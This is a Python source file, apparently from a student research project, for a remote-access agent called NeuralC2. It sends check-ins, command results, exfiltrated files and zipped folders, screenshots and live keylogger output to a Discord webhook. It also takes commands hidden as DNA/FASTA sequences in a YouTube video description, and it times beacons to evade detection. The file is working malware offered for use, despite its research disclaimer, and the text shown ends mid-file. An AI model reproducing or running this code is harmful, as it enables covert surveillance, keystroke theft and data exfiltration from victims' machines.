"""
NeuralC2 Agent — 3-Mode Adversarial Research Framework
=======================================================
Original base: APTForge Enhanced Victim Agent v2.0
Modified for: FYP — Biocomputing Cybersecurity Research

FOUR AGENT MODES (select with --mode flag):
  --mode standard   Agent 1: StandardBot  — fixed 5s, plaintext        → DETECTABLE (control)
  --mode jitter     Agent 2: JitterBot    — random timing, plaintext    → PARTIAL evasion
  --mode neural     Agent 3: NeuralC2     — Poisson ISI + DNA/FASTA     → FULL evasion (default)
  --mode youtube    Agent 4: YouTubeC2    — LoTS: commands in YT video  → NEAR-ZERO signature

USAGE:
  python agent.py --mode standard    # Run detectable baseline
  python agent.py --mode jitter      # Run partial evasion
  python agent.py --mode neural      # Run full NeuralC2 (default)
  python agent.py --mode youtube     # Run YouTube covert channel agent
  python agent.py --mode neural -s   # Stealth (no console output)

YOUTUBE C2 ENVIRONMENT VARS (--mode youtube):
  YT_VIDEO_ID      YouTube video ID whose description holds encoded commands
  YT_API_KEY       YouTube Data API v3 key (or set to SCRAPE for keyless mode)
  YT_POLL_INTERVAL Poll interval in seconds (default: 60)

DISCLAIMER: FOR EDUCATIONAL / RESEARCH USE ONLY IN ISOLATED VM ENVIRONMENTS
"""

import os
import sys
import subprocess

def _auto_install():
    try:
        import PIL, pynput, psutil, requests
    except ImportError:
        print("[!] Missing dependencies. Auto-installing...")
        cmd = [sys.executable, "-m", "pip", "install", "requests", "pillow", "pynput", "psutil"]
        if sys.platform.startswith("linux"):
            cmd.append("--break-system-packages")
        try:
            subprocess.check_call(cmd)
            print("[+] Dependencies installed. Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception as e:
            print(f"[-] Failed to install dependencies: {e}")
_auto_install()

import requests
import time
import platform
import socket
import uuid
import os
import sys
import subprocess
import random
import math
from datetime import datetime
import io
import base64
import threading
import zipfile
import shutil
import webbrowser
import json
from pathlib import Path
from dotenv import load_dotenv

load_dotenv()

# ==================== NEUROC2 ENGINE ====================

class NeuralC2Engine:
    """
    Bio-inspired obfuscation layer.
    Wraps all outbound C2 traffic in DNA-encoded FASTA payloads
    and schedules transmissions using Poisson Inter-Spike Intervals (ISI).
    """

    # DNA codon table: maps printable ASCII → 3-base codon
    BASES = ['A', 'T', 'G', 'C']

    def __init__(self, rate_lambda=0.5, spike_data_file=None):
        """
        Args:
            rate_lambda: Poisson firing rate in spikes/second.
                         Controls mean beacon interval (default 0.5 → ~2s mean).
                         For C2 timing scale, multiply by a time_scale factor.
            spike_data_file: Optional path to CRCNS CSV spike data.
                             If provided, real neuron ISI values are used instead
                             of synthetic Poisson samples.
        """
        self.rate_lambda = rate_lambda
        self.time_scale  = 30        # Scale ISI seconds → realistic beacon intervals
        self.spike_data  = []
        self.spike_index = 0

        if spike_data_file and os.path.exists(spike_data_file):
            self._load_spike_data(spike_data_file)

    # ---- ISI Timing ----

    def _load_spike_data(self, filepath):
        """Load real CRCNS spike timestamps from CSV and compute ISIs."""
        try:
            import csv
            timestamps = []
            with open(filepath, newline='') as f:
                reader = csv.reader(f)
                for row in reader:
                    try:
                        timestamps.append(float(row[0]))
                    except (ValueError, IndexError):
                        continue
            timestamps.sort()
            self.spike_data = [
                timestamps[i+1] - timestamps[i]
                for i in range(len(timestamps)-1)
                if timestamps[i+1] - timestamps[i] > 0
            ]
            print(f'[NeuralC2] Loaded {len(self.spike_data)} real ISI values from {filepath}')
        except Exception as e:
            print(f'[NeuralC2] Failed to load spike data: {e} — falling back to Poisson')

    def next_interval(self):
        """
        Return next beacon wait time (seconds).
        Uses real spike data if available, otherwise synthetic Poisson ISI.
        """
        if self.spike_data:
            isi = self.spike_data[self.spike_index % len(self.spike_data)]
            self.spike_index += 1
            # Scale the raw neuron ISI (milliseconds-range) to beacon time
            return isi * self.time_scale
        else:
            # Exponential distribution: ISI ~ Exp(λ)
            raw_isi = random.expovariate(self.rate_lambda)
            return raw_isi * self.time_scale

    # ---- DNA Encoding ----

    def _char_to_codon(self, c):
        """
        Map a single character to a 4-base DNA codon (full 8-bit, lossless).
        Splits byte into four 2-bit groups: b1=bits7-6, b2=bits5-4,
        b3=bits3-2, b4=bits1-0. Index always 0-3, IndexError impossible.
        """
        val = ord(c) & 0xFF
        b1  = self.BASES[(val >> 6) & 0x3]
        b2  = self.BASES[(val >> 4) & 0x3]
        b3  = self.BASES[(val >> 2) & 0x3]
        b4  = self.BASES[val & 0x3]
        return b1 + b2 + b3 + b4

    def encode_payload(self, plaintext):
        """Encode plaintext string to DNA codon sequence."""
        return ''.join(self._char_to_codon(c) for c in plaintext)

    def decode_payload(self, dna_sequence):
        """Decode a DNA codon sequence back to plaintext (mirrors server decoder)."""
        clean = ''.join(c for c in dna_sequence.upper() if c in 'ATGC')
        chars = []
        for i in range(0, len(clean), 4):
            codon = clean[i:i+4]
            if len(codon) == 4:
                b1 = self.BASES.index(codon[0])
                b2 = self.BASES.index(codon[1])
                b3 = self.BASES.index(codon[2])
                b4 = self.BASES.index(codon[3])
                chars.append(chr((b1 << 6) | (b2 << 4) | (b3 << 2) | b4))
        return ''.join(chars)

    def wrap_fasta(self, dna_sequence, label='BLAST_Match'):
        """
        Wrap DNA sequence in FASTA format.
        Output looks like legitimate bioinformatics data.
        """
        accession = f"XP_{random.randint(1000, 9999)}"
        score     = round(95.0 + random.random() * 4.9, 1)
        header    = f">{label}|Accession:{accession}|Score:{score}"
        return f"{header}\n{dna_sequence}"

    def obfuscate(self, message):
        """
        Full pipeline: plaintext → DNA encode → FASTA wrap.
        Returns disguised payload string ready for transmission.
        """
        dna     = self.encode_payload(message)
        payload = self.wrap_fasta(dna)
        return payload

    def build_checkin(self, victim_id, hostname, ip, os_type, features_str):
        """Build an obfuscated check-in payload."""
        raw = f"CHECKIN|{victim_id}|{hostname}|{ip}|{os_type}|{features_str}"
        return self.obfuscate(raw)

    def build_result(self, victim_id, result_text):
        """Build an obfuscated command-result payload."""
        raw = f"RESULT {victim_id}|{result_text}"
        return self.obfuscate(raw)

    def build_file_meta(self, tag, victim_id, filename, size):
        """Build an obfuscated file transfer metadata payload."""
        raw = f"{tag}|{victim_id}|{filename}|{size}"
        return self.obfuscate(raw)




# ==================== YOUTUBE C2 ENGINE ====================

class YouTubeC2Engine:
    """
    Agent 4 — Living-off-Trusted-Sites (LoTS) C2 channel.

    HOW IT WORKS:
      The attacker controls a YouTube video. Commands are encoded into
      the video description as DNA/FASTA sequences (same encoder as
      NeuralC2). The agent polls the video periodically via the YouTube
      Data API (or HTML scrape fallback), extracts and decodes the
      command, executes it, and exfiltrates results via Discord webhook
      (or another trusted channel).

    TO A NETWORK DEFENDER:
      All outbound traffic is HTTPS to googleapis.com and youtube.com
      — indistinguishable from a user loading a YouTube page.
      No suspicious IP, no unusual port, no detectable payload in transit.

    REAL-WORLD PRECEDENT:
      Astaroth Trojan (Cisco Talos 2020) — used YouTube channel
      descriptions to store encoded C2 server addresses.
      Casbaneiro, Janicab (2015), Stantinko (2019) — same technique.

    RESEARCH CONTRIBUTION (your addition):
      Prior malware used YouTube only as a config dead-drop to find
      the real C2 IP. This implementation uses YouTube as the FULL
      live command channel, with DNA/FASTA encoding layered on top
      so even if someone reads the description, they see
      bioinformatics research data, not commands.
    """

    # Separator tag written into the description between commands
    CMD_OPEN  = '[BioResearch_Seq]|Accession:'
    CMD_CLOSE = '|END'

    def __init__(self, video_id, api_key=None, poll_interval=60):
        self.video_id      = video_id
        self.api_key       = api_key          # None → scrape fallback
        self.poll_interval = poll_interval
        self.last_cmd_hash = None             # Prevent re-executing same command
        self.encoder       = NeuralC2Engine() # Reuse DNA encoder

    # ── Fetch description ──────────────────────────────────────

    def _fetch_via_api(self):
        """Fetch video description using YouTube Data API v3."""
        url    = 'https://www.googleapis.com/youtube/v3/videos'
        params = {
            'part': 'snippet',
            'id':   self.video_id,
            'key':  self.api_key,
        }
        r = requests.get(url, params=params, timeout=15)
        r.raise_for_status()
        items = r.json().get('items', [])
        if not items:
            return None
        return items[0]['snippet'].get('description', '')

    def _fetch_via_scrape(self):
        """
        Keyless fallback: scrape description from YouTube HTML.
        Works without an API key. Uses a plausible browser UA.
        """
        url     = f'https://www.youtube.com/watch?v={self.video_id}'
        headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/124.0.0.0 Safari/537.36'
            )
        }
        r    = requests.get(url, headers=headers, timeout=20)
        html = r.text
        # YouTube embeds description in JSON inside a <script> block
        import json, re
        match = re.search(r'"description":\{"simpleText":"(.*?)"\}', html)
        if match:
            raw = match.group(1)
            return raw.replace('\\n', '\n').replace('\\"', '"')
        # Fallback: look for attributedDescription
        match2 = re.search(r'"attributedDescription":\{"content":"(.*?)"', html)
        if match2:
            raw = match2.group(1)
            return raw.replace('\\n', '\n').replace('\\"', '"')
        return None

    def fetch_description(self):
        """Fetch video description using API or scrape fallback."""
        try:
            if self.api_key and self.api_key != 'SCRAPE':
                desc = self._fetch_via_api()
            else:
                desc = self._fetch_via_scrape()
            return desc or ''
        except Exception as e:
            print(f'[YouTubeC2] Fetch error: {e}')
            return ''

    # ── Command extraction ─────────────────────────────────────

    def extract_command(self, description):
        """
        Pull the latest command from the video description.
        Commands are wrapped as:  >BioResearch_Seq|Accession:XXXXXXXX|END
        where XXXXXXXX is the DNA-encoded, FASTA-formatted command.
        Returns (command_string, raw_fasta) or (None, None) if nothing found.
        """
        import re, hashlib
        # Find all embedded sequences (tolerating optional whitespace, formatting, or prefixes)
        # It looks for "[BioResearch_Seq]|Accession:" then captures whatever is before the DNA sequence,
        # then captures the DNA sequence consisting of A,T,G,C, and finally stops at |END
        pattern = re.compile(
            re.escape(self.CMD_OPEN) + r'([^|]*?)\s*([ATGC\s\n\r]+)' + re.escape(self.CMD_CLOSE),
            re.DOTALL | re.IGNORECASE
        )
        matches = list(pattern.finditer(description))
        if not matches:
            return None, None

        # Take the LAST match (most recently added command)
        m         = matches[-1]
        accession = m.group(1).strip()
        dna_seq   = ''.join(c for c in m.group(2).upper() if c in 'ATGC')
        raw_fasta = (self.CMD_OPEN + accession + "\n" + dna_seq + self.CMD_CLOSE)

        # Hash to detect if already processed
        cmd_hash = hashlib.md5(dna_seq.encode()).hexdigest()
        if cmd_hash == self.last_cmd_hash:
            return None, None   # Already executed this command

        # Decode
        try:
            plaintext = self.encoder.decode_payload(dna_seq)
            self.last_cmd_hash = cmd_hash
            return plaintext.strip(), raw_fasta
        except Exception as e:
            print(f'[YouTubeC2] Decode error: {e}')
            return None, None

    # ── Encode a command (for attacker to paste into description) ──

    def encode_command(self, command):
        """
        Returns the string to paste into the YouTube video description.
        The attacker runs this helper to produce the encoded block.
        """
        import random
        dna       = self.encoder.encode_payload(command)
        accession = f"XP_{random.randint(10000,99999)}"
        return self.CMD_OPEN + accession + "\n" + dna + self.CMD_CLOSE

    def poll_and_execute(self, execute_fn, result_fn):
        """
        Main polling loop.
        execute_fn  : callable(command) → result string
        result_fn   : callable(result)  → sends result back to C2
        """
        print(f'[YouTubeC2] Polling video: {self.video_id}')
        print(f'[YouTubeC2] Interval: {self.poll_interval}s  API: {"key" if self.api_key and self.api_key != "SCRAPE" else "scrape"}')
        while True:
            try:
                print(f'[YouTubeC2] Fetching description...')
                desc = self.fetch_description()
                if desc:
                    print(f'[YouTubeC2] Description fetched ({len(desc)} chars). First 200: {repr(desc[:200])}')
                    cmd, fasta = self.extract_command(desc)
                    if cmd:
                        print(f'[YouTubeC2] ✓ Command extracted: {cmd[:60]}')
                        result = execute_fn(cmd)
                        result_fn(result)
                    else:
                        print(f'[YouTubeC2] No command found in description (looking for [BioResearch_Seq]...)')
                else:
                    print(f'[YouTubeC2] ✗ Description empty or fetch failed!')
            except Exception as e:
                import traceback
                print(f'[YouTubeC2] Poll error: {e}')
                traceback.print_exc()
            print(f'[YouTubeC2] Sleeping {self.poll_interval}s...')
            time.sleep(self.poll_interval)

# ==================== OPTIONAL IMPORTS ====================

try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    print("[!] PIL not installed - screenshot feature disabled")

try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("[!] pynput not installed - keylogger feature disabled")

try:
    import tkinter as tk
    RANSOMWARE_AVAILABLE = True
    from ransomware_sim import RansomwareSimulator
except ImportError:
    RANSOMWARE_AVAILABLE = False
    print("[!] tkinter / ransomware_sim not available")


# ==================== CONFIGURATION ====================

WEBHOOK_URL        = os.getenv('DISCORD_WEBHOOK', 'YOUR_WEBHOOK_URL_HERE')
BOT_TOKEN          = os.getenv('DISCORD_TOKEN',   'YOUR_BOT_TOKEN_HERE')
CHANNEL_ID         = os.getenv('CHANNEL_ID',      'YOUR_CHANNEL_ID_HERE')

# ── Agent mode (set via --mode argument or AGENT_MODE env var) ──
# standard : Agent 1 — fixed 5s, plaintext   → BioShield CATCHES this (control)
# jitter   : Agent 2 — random 1-30s, plaintext → BioShield PARTIALLY catches
# neural   : Agent 3 — Poisson ISI, DNA/FASTA  → BioShield MISSES (your contribution)
_mode_arg   = ([a.split('=')[1] if '=' in a else sys.argv[sys.argv.index(a)+1]
                for a in sys.argv if a in ('--mode',) or a.startswith('--mode=')] or [None])[0]
AGENT_MODE  = _mode_arg or os.getenv('AGENT_MODE', 'neural')
if AGENT_MODE not in ('standard', 'jitter', 'neural', 'youtube'):
    print(f'[!] Unknown mode "{AGENT_MODE}" — defaulting to neural')
    AGENT_MODE = 'neural'


def _get_or_create_victim_id():
    """Persist victim ID to a file so restarts don't create duplicate sessions."""
    id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), f'.victim_id_{AGENT_MODE}')
    if os.path.exists(id_file):
        with open(id_file) as f:
            vid = f.read().strip()
            if vid:
                return vid
    vid = str(uuid.uuid4())[:8]
    with open(id_file, 'w') as f:
        f.write(vid)
    return vid

VICTIM_ID          = _get_or_create_victim_id()
last_message_id    = 0

# NeuralC2 parameters — tune for your experiment
ISI_LAMBDA         = float(os.getenv('ISI_LAMBDA', '0.5'))   # Poisson rate (spikes/sec)
SPIKE_DATA_FILE    = os.getenv('SPIKE_DATA_FILE', '')         # Path to CRCNS CSV (optional)

# Initialise the obfuscation engine (used in neural mode only)
neural_engine = NeuralC2Engine(
    rate_lambda     = ISI_LAMBDA,
    spike_data_file = SPIKE_DATA_FILE if SPIKE_DATA_FILE else None
)

# ── YouTube C2 parameters (--mode youtube) ─────────────────────
YT_VIDEO_ID      = os.getenv('YT_VIDEO_ID', '')        # Video ID whose description holds commands
YT_API_KEY       = os.getenv('YT_API_KEY', 'SCRAPE')   # YouTube Data API key, or 'SCRAPE'
YT_POLL_INTERVAL = int(os.getenv('YT_POLL_INTERVAL', '20'))

# Initialise YouTube engine (only activated in youtube mode)
youtube_engine = YouTubeC2Engine(
    video_id      = YT_VIDEO_ID,
    api_key       = YT_API_KEY if YT_API_KEY else None,
    poll_interval = YT_POLL_INTERVAL,
) if YT_VIDEO_ID else None

# ── Mode-specific timing function ──────────────────────────────
def next_beacon_interval():
    """
    Return the next wait time (seconds) based on active agent mode.

    standard  → Fixed 5.0s  (CV=0.0, trivially detected)
    jitter    → Uniform random 1-30s (CV~0.55, partially detected)
    neural    → Poisson ISI × time_scale (CV~1.0, statistically human)
    """
    if AGENT_MODE == 'standard':
        return 5.0
    elif AGENT_MODE == 'jitter':
        return random.uniform(1.0, 30.0)
    elif AGENT_MODE == 'youtube':
        return float(YT_POLL_INTERVAL)   # YouTube polls on its own schedule
    else:  # neural
        return neural_engine.next_interval()

# ── Mode-specific payload builder ──────────────────────────────
def build_checkin_payload(victim_id, hostname, ip, os_type, features_str):
    """
    Encode check-in based on mode.
    standard / jitter : raw plaintext  (BioShield sees unencoded CHECKIN)
    neural            : DNA-encoded FASTA (BioShield sees bioinformatics data)
    """
    raw = f"CHECKIN|{victim_id}|{hostname}|{ip}|{os_type}|{features_str}"
    if AGENT_MODE == 'neural':
        return neural_engine.obfuscate(raw)
    return raw  # plaintext for standard and jitter

def build_result_payload(victim_id, result_text):
    raw = f"RESULT {victim_id}|{result_text}"
    if AGENT_MODE == 'neural':
        return neural_engine.build_result(victim_id, result_text)
    return raw

def build_file_meta_payload(tag, victim_id, filename, size):
    raw = f"{tag}|{victim_id}|{filename}|{size}"
    if AGENT_MODE == 'neural':
        return neural_engine.build_file_meta(tag, victim_id, filename, size)
    return raw

# File transfer settings
DOWNLOAD_FOLDER    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_download")
UPLOAD_FOLDER      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_upload")
MAX_FILE_SIZE      = 8 * 1024 * 1024   # 8 MB Discord attachment limit

os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
os.makedirs(UPLOAD_FOLDER,   exist_ok=True)

# Keylogger state
keylog_buffer   = []
keylog_active   = False
keylog_thread   = None
keylog_listener = None   # For pynput listener cleanup
keylog_pulse_thread = None

# Ransomware state
ransomware_active       = False
ransomware_message_file = None


# ==================== CORE TRANSMISSION ====================

def get_system_info():
    """Get hostname and local IP."""
    try:
        hostname = socket.gethostname()
        ip       = socket.gethostbyname(hostname)
        return hostname, ip
    except Exception:
        return "Unknown", "Unknown"


def send_webhook(content, username=None, file_data=None, filename=None, retries=3):
    """
    Transmit message via Discord webhook.
    Content should already be FASTA-obfuscated before calling this.
    """
    if not username:
        username = f'BioResearch-{VICTIM_ID}'   # Neutral-looking username

    data = {'content': content, 'username': username}

    for attempt in range(retries):
        try:
            if file_data and filename:
                files    = {'file': (filename, file_data, 'application/octet-stream')}
                payload  = {'content': content, 'username': username}
                response = requests.post(
                    WEBHOOK_URL,
                    data={'payload_json': json.dumps(payload)},
                    files=files,
                    timeout=30
                )
            else:
                response = requests.post(WEBHOOK_URL, json=data, timeout=10)

            if response.status_code in [200, 204]:
                print(f'[+] Sent: {content[:80]}...')
                return True
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 2)
                print(f'[-] Rate limited. Retrying in {retry_after}s...')
                time.sleep(retry_after)
                continue
            else:
                print(f'[-] Webhook error: {response.status_code}')
                return False
        except Exception as e:
            print(f'[-] Send failed: {e}')
            time.sleep(2)
    return False


def send_checkin():
    """
    Send check-in beacon.
    Payload format depends on AGENT_MODE:
      standard/jitter → plaintext CHECKIN string
      neural          → DNA-encoded FASTA payload
    """
    hostname, ip  = get_system_info()
    os_type       = platform.system()

    features = []
    if SCREENSHOT_AVAILABLE: features.append("screenshot")
    if KEYLOGGER_AVAILABLE:  features.append("keylogger")
    features.append("file_transfer")
    features.append(f"mode:{AGENT_MODE}")
    features_str = ",".join(features) if features else "basic"

    payload = f"CHECKIN|{VICTIM_ID}|{hostname}|{ip}|{os_type}|{features_str}|{os.getcwd()}"
    if AGENT_MODE == 'neural':
        payload = neural_engine.obfuscate(payload)
    return send_webhook(payload)


def send_disconnect():
    """Notify the C2 server that the agent is gracefully shutting down."""
    payload = f"DISCONNECT|{VICTIM_ID}"
    if AGENT_MODE == 'neural':
        payload = neural_engine.obfuscate(payload)
    return send_webhook(payload)


def send_result(result):
    """
    Send command result back to C2.
    standard/jitter → plaintext RESULT string
    neural          → DNA-encoded FASTA payload
    Handles large outputs by attaching them as files.
    """
    if result.startswith("LS_JSON|") or result.startswith("PS_JSON|"):
        payload = result
    else:
        payload = f"RESULT {VICTIM_ID}|{os.getcwd()}|{result}"

    # FASTA encoding expands text by 4x. Discord limit is 2000 chars.
    max_size = 450 if AGENT_MODE == 'neural' else 1900

    if len(payload) > max_size:
        meta_str = f"RESULT_FILE|{VICTIM_ID}|{os.getcwd()}"
        if AGENT_MODE == 'neural':
            meta_str = neural_engine.obfuscate(meta_str)
        return send_webhook(meta_str, file_data=payload.encode(), filename=f"res_{VICTIM_ID}.txt")
    else:
        if AGENT_MODE == 'neural':
            payload = neural_engine.obfuscate(payload)
        send_webhook(payload)


def get_recent_messages():
    """Poll Discord channel for new commands."""
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        return []

    url     = f'https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=50'
    headers = {'Authorization': f'Bot {BOT_TOKEN}'}

    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
        elif response.status_code == 401:
            print('[-] AUTH ERROR: Invalid Discord bot token')
            return []
        else:
            print(f'[-] API error: {response.status_code}')
            return []
    except Exception as e:
        print(f'[-] Get messages error: {e}')
        return []


def _ls_json(req_id, path):
    """Return directory listing as JSON for the file browser."""
    import json as _json
    try:
        path = os.path.expandvars(os.path.expanduser(path))
        # Support '/' as root on Windows by converting to actual drive root
        if path in ['/', '\\']:
            path = os.path.abspath(os.sep)
            
        if not os.path.exists(path):
            return f"LS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|[]"
        if not os.path.isdir(path):
            st    = os.stat(path)
            entry = [{'name': os.path.basename(path), 'type': 'file',
                      'size': st.st_size,
                      'modified': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')}]
            return f"LS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|{_json.dumps(entry)}"

        entries = []
        try:
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st   = os.stat(full)
                    typ  = 'dir' if os.path.isdir(full) else 'file'
                    entries.append({
                        'name':     name,
                        'type':     typ,
                        'size':     st.st_size if typ == 'file' else 0,
                        'modified': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M'),
                    })
                except (PermissionError, OSError):
                    entries.append({'name': name, 'type': 'file', 'size': 0, 'modified': '—'})
        except PermissionError:
            return f"LS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|[]"

        return f"LS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|{_json.dumps(entries)}"
    except Exception as e:
        return f"LS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|[]"


def _ps_list(req_id='0'):
    """Return process list as JSON."""
    import json as _json
    import subprocess
    entries = []
    
    try:
        import psutil
        for p in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                p_info = p.info
                name = p_info.get('name', 'unknown')
                if isinstance(name, bytes):
                    name = name.decode('utf-8', errors='ignore')
                mem = p_info.get('memory_info')
                mem_mb = int(mem.rss) // 1048576 if mem else 0
                entries.append({'name': name, 'pid': p_info.get('pid', 0), 'mem': f"{mem_mb}MB"})
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return f"PS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|{_json.dumps(entries)}"
    except ImportError:
        pass # Fallback to native commands
        
    try:
        if os.name == 'nt':
            # Windows: tasklist
            cmd = 'tasklist /FO CSV'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            # Simple CSV parse
            lines = result.stdout.strip().split('\n')[1:]
            for line in lines:
                parts = [p.strip('"') for p in line.split(',')]
                if len(parts) >= 2:
                    entries.append({'name': parts[0], 'pid': parts[1], 'mem': parts[4] if len(parts)>4 else '?'})
            return f"PS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|{_json.dumps(entries)}"
        else:
            # Linux: ps
            cmd = 'ps -eo comm,pid,rss --sort=-rss'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            lines = result.stdout.strip().split('\n')[1:]
            for line in lines:
                parts = line.split()
                if len(parts) >= 3:
                    try:
                        mem_mb = int(parts[2]) // 1024
                        entries.append({'name': parts[0], 'pid': parts[1], 'mem': f"{mem_mb}MB"})
                    except ValueError:
                        pass
        return f"PS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|{_json.dumps(entries)}"
    except Exception as e:
        return f"PS_JSON|{req_id}|{VICTIM_ID}|{os.getcwd()}|[]"


# ==================== FILE TRANSFER ====================

def download_file_from_victim(file_path):
    """Read file from victim disk and exfiltrate via webhook."""
    try:
        file_path = os.path.expanduser(file_path)
        if not os.path.exists(file_path):
            return f"[!] File not found: {file_path}"
        if os.path.isdir(file_path):
            return exfiltrate_folder(file_path)

        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            return f"[!] File too large: {file_size/1024/1024:.1f}MB (max 8MB)"

        with open(file_path, 'rb') as f:
            file_data = f.read()

        filename   = os.path.basename(file_path)
        meta       = build_file_meta_payload('DOWNLOAD', VICTIM_ID, filename, file_size)
        result     = send_webhook(meta, file_data=file_data, filename=filename)

        return f"[+] Downloaded: {filename} ({file_size/1024:.1f} KB)" if result \
               else f"[!] Failed to send: {filename}"

    except Exception as e:
        return f"[!] Download error: {e}"


def exfiltrate_folder(folder_path):
    """ZIP and exfiltrate an entire folder."""
    try:
        folder_path = os.path.expanduser(folder_path)
        if not os.path.exists(folder_path):
            return f"[!] Folder not found: {folder_path}"
        if not os.path.isdir(folder_path):
            return f"[!] Not a directory: {folder_path}"

        zip_filename = f"{os.path.basename(folder_path)}_{VICTIM_ID}.zip"
        zip_path     = os.path.join(DOWNLOAD_FOLDER, zip_filename)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    fp = os.path.join(root, file)
                    try:
                        zipf.write(fp, os.path.relpath(fp, folder_path))
                    except Exception:
                        pass

        zip_size = os.path.getsize(zip_path)
        if zip_size > MAX_FILE_SIZE:
            os.remove(zip_path)
            return f"[!] Archive too large: {zip_size/1024/1024:.1f}MB"

        with open(zip_path, 'rb') as f:
            zip_data = f.read()

        meta   = build_file_meta_payload('EXFIL', VICTIM_ID, zip_filename, zip_size)
        result = send_webhook(meta, file_data=zip_data, filename=zip_filename)
        os.remove(zip_path)

        return f"[+] Exfiltrated: {zip_filename} ({zip_size/1024:.1f} KB)" if result \
               else "[!] Exfiltration failed"

    except Exception as e:
        return f"[!] Exfiltration error: {e}"


def download_file_from_c2(url, save_as=None, target_dir=None):
    """Pull file from C2 (Discord CDN) down to victim machine."""
    try:
        response = requests.get(url, timeout=60, stream=True)
        if response.status_code != 200:
            return f"[!] Download failed: HTTP {response.status_code}"

        if not save_as:
            from urllib.parse import urlparse
            save_as = os.path.basename(urlparse(url).path) or f"dl_{int(time.time())}"

        # If target_dir is provided, use it. Otherwise use default UPLOAD_FOLDER
        base_folder = target_dir if target_dir else UPLOAD_FOLDER
        os.makedirs(base_folder, exist_ok=True)
        
        save_path = os.path.join(base_folder, save_as)
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)

        file_size = os.path.getsize(save_path)
        return f"[+] Uploaded to victim: {save_as} ({file_size/1024:.1f} KB)"

    except Exception as e:
        return f"[!] Upload error: {e}"


def upload_file_from_attachment(message_id, target_dir=None):
    """Fetch file attached to a specific Discord message."""
    try:
        url     = f'https://discord.com/api/v10/channels/{CHANNEL_ID}/messages/{message_id}'
        headers = {'Authorization': f'Bot {BOT_TOKEN}'}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code != 200:
            return f"[!] Failed to get message: HTTP {response.status_code}"

        attachments = response.json().get('attachments', [])
        if not attachments:
            return "[!] No attachments in message"

        results = [download_file_from_c2(a['url'], a['filename'], target_dir) for a in attachments]
        return "\n".join(results)

    except Exception as e:
        return f"[!] Attachment error: {e}"


# ==================== SCREENSHOT ====================

def take_screenshot():
    if not SCREENSHOT_AVAILABLE:
        return None, "[!] Screenshot unavailable (install pillow)"
    try:
        screenshot    = ImageGrab.grab()
        buf           = io.BytesIO()
        screenshot.save(buf, format='PNG', optimize=True)
        buf.seek(0)
        w, h = screenshot.size
        return buf.getvalue(), f"Screenshot: {w}x{h}"
    except Exception as e:
        return None, f"[!] Screenshot failed: {e}"


def send_screenshot():
    data, message = take_screenshot()
    if data:
        fname   = f"bio_scan_{VICTIM_ID}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        payload = neural_engine.build_result(VICTIM_ID, message)
        send_webhook(payload, file_data=data, filename=fname)
    return message


# ==================== KEYLOGGER ====================

def on_key_press(key):
    global keylog_buffer
    try:
        # Standard character
        keylog_buffer.append(key.char)
    except AttributeError:
        # Special keys
        mapping = {
            keyboard.Key.space:     ' ',
            keyboard.Key.enter:     ' [ENTER]\n',
            keyboard.Key.backspace: ' [BACKSPACE] ',
            keyboard.Key.tab:       ' [TAB] ',
            keyboard.Key.shift:     '', # Silent shift
            keyboard.Key.shift_r:   '',
            keyboard.Key.ctrl_l:    ' [CTRL] ',
            keyboard.Key.ctrl_r:    ' [CTRL] ',
            keyboard.Key.alt_l:     ' [ALT] ',
            keyboard.Key.alt_gr:    ' [ALT] ',
        }
        keylog_buffer.append(mapping.get(key, f' [{str(key).replace("Key.","").upper()}] '))


def start_keylogger():
    global keylog_active, keylog_thread, keylog_listener, keylog_pulse_thread, keylog_buffer
    if not KEYLOGGER_AVAILABLE:
        return "[!] Keylogger unavailable (install pynput)"
    if keylog_active:
        return "[!] Keylogger already running"
    
    keylog_buffer  = []
    keylog_active  = True

    # 1. Start the listener thread
    def listen():
        global keylog_listener
        with keyboard.Listener(on_press=on_key_press) as listener:
            keylog_listener = listener
            listener.join()

    keylog_thread = threading.Thread(target=listen, daemon=True)
    keylog_thread.start()

    # 2. Start the auto-pulse thread (streams logs every 2s for "real-time" feel)
    def pulse():
        while keylog_active:
            time.sleep(2)
            if keylog_active and keylog_buffer:
                log_data = dump_keylog()
                send_result(log_data)

    keylog_pulse_thread = threading.Thread(target=pulse, daemon=True)
    keylog_pulse_thread.start()

    return f"[+] Keylogger active. Syncing in real-time (2s buffer)..."


def stop_keylogger():
